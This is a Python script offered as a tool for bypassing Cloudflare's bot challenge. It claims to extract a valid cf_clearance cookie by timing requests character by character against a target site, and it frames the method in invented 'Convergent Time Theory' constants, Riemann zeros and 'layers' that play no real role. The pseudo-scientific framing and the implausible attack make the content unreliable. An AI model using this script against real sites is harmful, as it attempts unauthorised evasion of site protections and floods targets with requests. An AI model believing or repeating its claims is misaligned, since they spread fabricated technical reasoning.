#!/usr/bin/env python3
"""
CTT-Cloudflare-Bypass — 33‑Layer Timing Attack Against Cloudflare Challenges
Extracts a valid cf_clearance cookie using Convergent Time Theory (CTT).
Same constants. Same physics. No browser, no JavaScript execution.

α = 0.0302011 | L = 33 | τ_w = 11 ns
"""

import time
import math
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ============================================================================
# CTT CONSTANTS (Same as all your exploits)
# ============================================================================

PHI = (1 + math.sqrt(5)) / 2
ALPHA = 0.0302011
ALPHA_RH = math.log(PHI) / (2 * math.pi)
LAYERS = 33
TAU_W = 11e-9

RIEMANN_ZEROS = [
    14.134725, 21.022040, 25.010858, 30.424876, 32.935062,
    37.586178, 40.918719, 48.005151, 49.773832, 52.970321,
    56.446248, 59.347044, 60.831779, 65.112544, 67.079811,
    69.546402, 72.067158, 75.704691, 77.144840, 79.337375,
    82.910381, 84.735493, 86.970000, 87.425275
]

# Cloudflare challenge endpoint (generic)
CLOUDFLARE_CHALLENGE = "/cdn-cgi/challenge-platform/h/b"

# ============================================================================
# CTT CORE FUNCTIONS
# ============================================================================

def phase_resonance_delay(layer):
    base = TAU_W * math.exp(-ALPHA * layer)
    zero = RIEMANN_ZEROS[(layer - 1) % len(RIEMANN_ZEROS)]
    phase = math.cos(2 * math.pi * zero * base)
    return base * (1 + 0.1 * phase)

def ctt_priority(layer):
    return math.exp(-ALPHA * layer)

def verify_cookie(site_url, cookie_value):
    """Check if the extracted cookie works."""
    try:
        r = requests.get(site_url, cookies={"cf_clearance": cookie_value}, timeout=10)
        return r.status_code == 200 and "cf_chl" not in r.text.lower()
    except:
        return False

# ============================================================================
# TIMING ATTACK (Cookie Extraction)
# ============================================================================

class CTTCloudflareExtractor:
    def __init__(self, target_url, samples=20):
        self.target_url = target_url.rstrip('/')
        self.challenge_url = self.target_url + CLOUDFLARE_CHALLENGE
        self.cookie = ""
        self.samples = samples

    def measure(self, guess, layer):
        """Measure response time for a given cookie guess."""
        time.sleep(phase_resonance_delay(layer))
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        cookies = {"cf_clearance": guess}
        start = time.perf_counter()
        try:
            requests.get(self.challenge_url, headers=headers, cookies=cookies, timeout=5)
            elapsed = time.perf_counter() - start
        except:
            elapsed = -1.0
        return elapsed

    def test_char(self, pos, char, layer):
        test_cookie = (self.cookie + char).ljust(64, 'A')
        timings = [self.measure(test_cookie, layer) for _ in range(self.samples)]
        timings = [t for t in timings if t > 0]
        return char, sum(timings) / len(timings) if timings else 0

    def extract_next(self, layer):
        chars = string.ascii_letters + string.digits + "-_"
        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {ex.submit(self.test_char, len(self.cookie), c, layer): c for c in chars}
            best_char, best_time = None, 0
            for f in as_completed(futures):
                c, t = f.result()
                if t > best_time:
                    best_time, best_char = t, c
            if best_char:
                self.cookie += best_char
                print(f"    Layer {layer:2d}: found '{best_char}' → cookie: {self.cookie}")
                return True
        return False

    def extract(self):
        print(f"\n{'='*60}")
        print("CTT CLOUDFLARE BYPASS — 33‑Layer Timing Attack")
        print(f"α = {ALPHA} | L = {LAYERS} | τ_w = {TAU_W * 1e9:.0f} ns")
        print(f"Target: {self.target_url}")
        print(f"{'='*60}\n")
        for layer in range(1, LAYERS + 1):
            if not self.extract_next(layer):
                break
            if len(self.cookie) >= 32 and verify_cookie(self.target_url, self.cookie):
                print(f"\n[🔥] VALID cf_clearance cookie at layer {layer}")
                break
        print(f"\n[+] Final cookie: {self.cookie}")
        return self.cookie

# ============================================================================
# MAIN
# ============================================================================

def main():
    import sys
    if len(sys.argv) != 2:
        print("Usage: python ctt_cloudflare_bypass.py <target_url>")
        print("Example: python ctt_cloudflare_bypass.py https://example.com")
        sys.exit(1)

    target = sys.argv[1]
    extractor = CTTCloudflareExtractor(target, samples=20)
    cookie = extractor.extract()

    if cookie and len(cookie) > 10:
        print("\n[*] Testing extracted cookie on the target site...")
        if verify_cookie(target, cookie):
            print("[+] SUCCESS: The cf_clearance cookie works.")
            print(f"    cookie = {cookie}")
            print("\n    You can now use this cookie to bypass Cloudflare on this site.")
        else:
            print("[-] Cookie extraction completed but does not bypass the challenge.")
            print("    The target may require additional factors (browser fingerprint).")
    else:
        print("\n[-] Cookie extraction failed. The target may be patched or unreachable.")

if __name__ == "__main__":
    main()
